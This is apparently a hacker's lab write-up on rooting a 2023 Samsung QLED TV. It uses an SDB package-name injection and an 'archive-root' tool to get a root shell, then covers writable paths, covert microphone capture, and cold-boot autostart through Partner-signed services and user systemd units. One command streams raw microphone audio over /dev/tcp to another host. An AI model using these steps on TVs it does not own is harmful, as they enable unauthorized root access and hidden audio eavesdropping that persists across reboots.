---
layout: post
title: Samsung Tizen TV — root, disk, mic, and cold-boot autostart (QE65Q70C)
date: 2026-10-23
last_modified_at: 2026-10-30
categories: [Hack]
tags: [samsung, tizen, tv, root, sdb, archive-root, uep, smack, systemd, microphone, partner, on-boot]
---

## Goal

Lab notes on **getting useful privilege** on a retail Samsung Smart TV — not “own the SoC forever”, but enough to:

1. obtain a **volatile `uid=0` shell** from a PC;
2. **read/write** durable paths under `/opt/usr`;
3. capture the **built-in / USB microphones** without a UI app;
4. **autostart a process after unplug** (real cold boot), without a host babysitter.

Access boundaries and hacks only — no product / app feature walkthrough.

Verified on:

| | |
|--|--|
| Model | **QE65Q70CATXXH** (65″ QLED, 2023) |
| Firmware family | **T-NKM2CDEUC-0090** |
| Platform | **Tizen 9.0**, Linux **5.4.77**, **armv7l** |
| Root route | `SVE-2025-50109` SDB foothold → **archive-root** |

> Instant On / soft power is **not** a reboot. To test cold boot, unplug the TV (or force a full restart), then power on again.
{: .prompt-warning }

## Mental model: root ≠ “everything allowed”

`archive-root` gives **UID/GID 0** and a fat capability mask, but several layers stay up:

| Layer | What it does | Root bypass? |
|-------|----------------|--------------|
| **UEP** | Blocks *execution* of unsigned ELF / script-as-program | **No** |
| **Smack** | Labels limit open / mmap / IPC | Soften sometimes; prefer correct labels |
| **RO rootfs** | `/etc`, many `/usr` paths write-protected | Prefer `/opt/usr` |
| **`/run`** | tmpfs — wiped every reboot/unplug | Must re-seed or avoid depending on it |

Smack after escalate still shows **`User`**. Treat “uid 0” as a strong foothold, not a kernel-signed god mode.

## 1. Volatile root: SDB foothold → archive-root

### Stack

| Piece | Role |
|-------|------|
| TV Developer Mode | Exposes SDB on TCP **26101** |
| [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root) ≥ **v0.0.9** | Host CLI + managed payloads |
| Tizen Studio `sdb` | Transport for package-name injection |
| Host OpenSSL + .NET 6 SDK | Build `common` / `common31` payloads |

On this set, interactive `sdb shell` prints `closed` — expected. The exploit never relies on that path.

### Chain (short)

1. **SDB package-name injection** (`SVE-2025-50109`): crafted `.tpk` name with backtick / `base64` substitution → process as **`uid=901(sdk)`** (audio / recorder groups, System SMACK).
2. **archive-root**: from that foothold, stage Samsung’s capability-bearing signed `dotnet` + archive launcher in a private mount namespace → escalate to **UID/GID 0** → authenticated root agent back to the host.
3. Cleanup: staging removed; system file hashes unchanged (**volatile** only).

Kernel routes in the same upstream repo (FDET / Mali) are **not** required for this NKM2-family TV.

### Host setup

```shell
git clone https://github.com/chris-ritsen/samsung-tv-root
cd samsung-tv-root
python3 -m venv .venv
.venv/bin/pip install -e .
make common-payload common31-payload
```

If `payloads/common31/global.json` pins an SDK patch you lack, set `"version"` to your installed 6.0.x and rebuild.

```shell
export SDB=/absolute/path/to/tizen-studio/tools/sdb
export TV_IP=192.168.0.101

"$SDB" connect "$TV_IP:26101"
.venv/bin/samsung-tv-root --sdb "$SDB" doctor
```

`doctor` should show **Payload common** and **common31** ready.

### Developer Mode

Apps → type `12345` → Developer Mode **On** → enter the lab PC IPv4 → reboot. Then:

```shell
"$SDB" connect "$TV_IP:26101"
"$SDB" -s "$TV_IP:26101" capability
```

### Acquire root

```shell
.venv/bin/samsung-tv-root --sdb "$SDB" -o json archive-root probe "$TV_IP"
.venv/bin/samsung-tv-root --sdb "$SDB" archive-root root "$TV_IP" --command 'id; uname -a'
```

Example probe success:

```json
{
  "authenticated": true,
  "uid": 0,
  "euid": 0,
  "gid": 0,
  "egid": 0,
  "cap_eff": "0000003fffffffff",
  "runtime": "6.0",
  "smack": "User",
  "staging_cleaned": true,
  "system_files_unchanged": true
}
```

Expect `uid=0(owner) gid=0(root)`. After reboot, re-run the host tool (Developer Mode + `sdb` still required). Root itself does **not** persist.

## 2. Disk: what you can actually write

### Durable vs volatile

| Path | Survives unplug? | Notes |
|------|------------------|-------|
| `/opt/usr/home/owner/…` | yes | Home for DLLs, configs, **user-systemd** units |
| `/opt/usr/share/systemd/system/` | yes | Fine as a *file* dump; **not** in system `UnitPath` |
| `/run/systemd/system/` | **no** | Systemd *does* load units from here — gone after cold boot |
| `/tmp/` | no | Logs / FIFOs only |
| `/home/owner/share/tmp/sdk_tools/` | yes (share) | Often the only reliable **SDB push** target |
| `/etc/systemd/…` | RO | Do not plan permanent enables here |

System `UnitPath` on this TV ≈ `/etc` + `/run` + `/usr/lib` (+ `/prd/…`) — **no** `/opt/usr/share/systemd`. Dropping unit files only under share does nothing until something copies them into `/run` (or you use user-systemd instead — §4).

### Deploy patterns that work

1. **HTTP from the lab** → on-TV `curl` into `/tmp` → `cp` under `/opt/usr/…` inside `archive-root --command`.
2. **Base64** via `--command 'echo … | base64 -d > …'` (no extra unsigned helper binary).
3. **SDB push** into `sdk_tools` / owner share, then root `cp` into the final path. Direct SDB into `/opt/usr/home/owner/...` is flaky.

Chown artifacts to **`5001:users`** when they will run under the owner user session (`systemd --user`).

### UEP: execution is the hard part

Root can *write* an unsigned `.sh` / ELF under owner home. **Executing** it as a program still fails:

```text
[uep][bash] the file is NOT signed!!
```

| OK to run | Unreliable / blocked |
|-----------|----------------------|
| Signed `/usr/bin/dotnet` + your **DLL** under `/opt/usr/home/owner/…` | Custom unsigned ARM ELF |
| `ExecStart=/usr/bin/dotnet …/App.dll` | `ExecStart=/opt/.../boot.sh` |
| `ExecStart=/bin/sh -c '…inline…'` | `/tmp/*.sh` as an executable path |
| Partner WGT JS (`execFile` / `spawn`, not `exec`→`/bin/sh`) | Public-cert WGT for `on-boot` |

Ship logic as **DLL**, **inline `sh -c`**, or **WGT JS**. Never as a new unsigned executable under owner home.

Stock TV image often has **no** `python3` / `strings` — prefer host-side checks or `grep -a` via root.

## 3. Microphone without a UI app

Still no WGT required. From **sdk** foothold or **root**, Pulse exposes capture devices.

Builtin array (example):

```text
tizentv-builtin-source  s16le 2ch 16000Hz
```

USB headsets show up as additional Pulse sources when plugged in.

Stream a short raw chunk to the lab (via `archive-root --command` or SDB inject):

```shell
parecord -d tizentv-builtin-source --raw --rate=16000 --channels=1 --format=s16le \
  --file-format=raw \
  | head -c 64000 >/dev/tcp/<lab-ip>/<port>
```

Notes from this lab:

- Prefer **`--file-format=raw`** when piping PCM; default Wave headers corrupt a continuous stream.
- `sdk` already has recorder-related groups — enough for many capture experiments before full root.
- Soft power / Instant On is unrelated to whether Pulse devices exist after a cold boot; after unplug the capture path must be started again by whatever you autostart (§4).

## 4. Autostart that survives unplug

Two mechanisms. They stack; for native long-lived processes prefer **B**.

### A. Partner-signed Web Service (`on-boot`)

A normal UI app with `background-support="enable"` is still a UI process. Samsung’s background worker is a **Web Service** (`http://tizen.org/feature/web.service`) with `on-boot` / `auto-restart`:

```xml
<tizen:feature name="http://tizen.org/feature/web.service"/>

<tizen:privilege name="http://tizen.org/privilege/internet"/>
<tizen:privilege name="http://tizen.org/privilege/application.launch"/>
<tizen:privilege name="http://tizen.org/privilege/filesystem.read"/>
<tizen:privilege name="http://tizen.org/privilege/filesystem.write"/>
<access origin="*" subdomains="true"/>

<tizen:background-category value="background-network"/>

<tizen:service id="YourPkg.Service" auto-restart="true" on-boot="true" type="ui">
  <tizen:content src="service/service.js"/>
  <tizen:name>LabKeeper</tizen:name>
  <tizen:description>Cold-boot keeper</tizen:description>
  <tizen:icon src="icon.png"/>
  <tizen:category name="http://tizen.org/category/service"/>
</tizen:service>
```

Package part of the ID is typically **≤ 10 characters**. Reuse a stable package id for updates — churning new ids can trip pkgmgr (“Load archive info fail”) on this TV.

#### Public vs Partner

`on-boot="true"` in XML is **not** enough on a commercial TV:

| Distributor privilege | Runs when launched | Survives Instant On | Auto-start after **cold boot** |
|--|--|--|--|
| **Public** | yes | yes | **no** |
| **Partner** (DUID-bound) | yes | yes | **yes** |

Partner for **testing**: normal Samsung developer account → distributor cert privilege **Partner** → attach TV **DUID** (`URN:tizen:deviceid=…` in SAN). Store publishing is separate; DUID sideload is enough for a lab set.

#### Certs / package / install

1. Developer Mode (same as §1).
2. `sdb capability` — note DUID.
3. Author cert (keep stable) + Partner distributor cert with that DUID.
4. If `tizen package` says **Invalid password** on a fresh `.p12`, re-export legacy PKCS#12 (3DES / SHA1). AES-PBES2 often breaks the Java signer.
5. Build / install:

```shell
rm -f *.wgt author-signature.xml signature1.xml .manifest.tmp
tizen package -t wgt -s <PartnerProfile> -- <project-dir>
tizen install -n YourApp.wgt -s <tv-host>:26101
```

Do **not** `tizen run` when testing auto-start. With Partner + `on-boot`, the service should start after install/update and again after unplug. `sdb` can stay offline until the TV is fully awake — that does not block `on-boot`.

#### WGT limits after cold boot

| Works | Often fails |
|-------|-------------|
| Service `onStart` (Partner) | `child_process.exec` → `/bin/sh` → **`EACCES`** |
| `execFile` / `spawn` of stock binaries | Blind trust in system `systemctl` from WGT |
| `app_launcher -s …` | Reading Smack **`User`** files under `/opt/usr/share/systemd` |
| Read/write `/opt/usr/home/owner/…` | Unsigned `/opt/.../*.sh` as a program (UEP) |

Keeper pattern: keep copies under **owner home**, call `systemctl --user …` via `execFile` with `XDG_RUNTIME_DIR` / session bus env. Treat WGT as best-effort; durable native workers belong in §4B.

Ghost / fake always-on UI apps: platform watchdog can blank the panel after wake — avoid.

Consumer QLED is not SSSP: no “URL Launcher / Auto Start Application” menu. Autostart is Web Service + Partner and/or user-systemd, not a Home-screen toggle. `auto-restart` helps after crashes; it does **not** replace Partner for boot.

### B. Owner `systemd --user` (authoritative for native processes)

System units under `/run` die with `/run`. Enabling under `/etc` is blocked by RO rootfs.

What *does* survive cold boot — same pattern used by long-lived owner workloads on this TV — is **user systemd**:

```text
/opt/usr/home/owner/.config/systemd/user/your-app.service
/opt/usr/home/owner/.config/systemd/user/default.target.wants/your-app.service  → …
```

On boot, `systemd --user` for uid **5001** comes up and pulls in `default.target` wants. No host watcher required.

Minimal unit shape:

```ini
[Unit]
Description=Lab worker
After=default.target
ConditionPathExists=/opt/usr/home/owner/app/App.dll

[Service]
Type=simple
WorkingDirectory=/opt/usr/home/owner/app
Environment=HOME=/opt/usr/home/owner
Environment=XDG_RUNTIME_DIR=/run/user/5001
Environment=DBUS_SESSION_BUS_ADDRESS=kernel:path=/sys/fs/kdbus/5001-user/bus
Environment=PULSE_SERVER=unix:/run/pulse/native
Environment=DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1
ExecStart=/usr/bin/dotnet /opt/usr/home/owner/app/App.dll /opt/usr/home/owner/app/config.json
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
```

Install from root: write the unit files + wants symlinks, then talk to the user manager (e.g. `nsenter` into the `systemd --user` PID as uid 5001) and run `systemctl --user daemon-reload && enable --now …`.

Do **not** put `User=root` in a user unit — the manager already runs as 5001.

Partner WGT can still help as a keeper, but the **source of truth for native cold boot** is the enabled user unit under `~/.config/systemd/user/`.

## 5. What this is not

- **Not** permanent root after reboot — reacquire with `archive-root`.
- **Not** a license to run unsigned ELF under UEP.
- **Not** “drop a `.service` in `/opt/usr/share/systemd` and forget it” — system `UnitPath` ignores that tree.
- **Not** Instant On as a cold-boot test.
- **Not** guaranteed on every regional SKU — match **exact model + firmware family**.

## Lab cheat sheet

| Observation | Detail |
|-------------|--------|
| `sdb shell` | Closes immediately; use inject / archive-root |
| Runtime | .NET **6.0** on device |
| Preflight caps | `/usr/bin/dotnet` `cap_setgid,cap_sys_admin=ei`; `sdbd-tarlauncher` `cap_setgid,cap_setuid=eip` |
| Owner uid for apps | Processes often **5001**; login name `owner` may show uid 0 in passwd — do not confuse the two |
| Talking to user systemd as root | `nsenter -t <systemd --user pid> -S 5001 -G 100 -- systemctl --user …` with `XDG_RUNTIME_DIR` / kdbus env |

## References

- [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root) — `archive-root` docs
- Bishop Fox / public write-ups of **SVE-2025-50109**
- [Tizen — Service application (Web)](https://docs.tizen.org/application/web/guides/applications/service-app/)
- [Samsung — Creating certificates](https://developer.samsung.com/smarttv/develop/getting-started/setting-up-sdk/creating-certificates.html)
- [Samsung — Privileges FAQ](https://developer.samsung.com/smarttv/develop/faq/privileges.html)
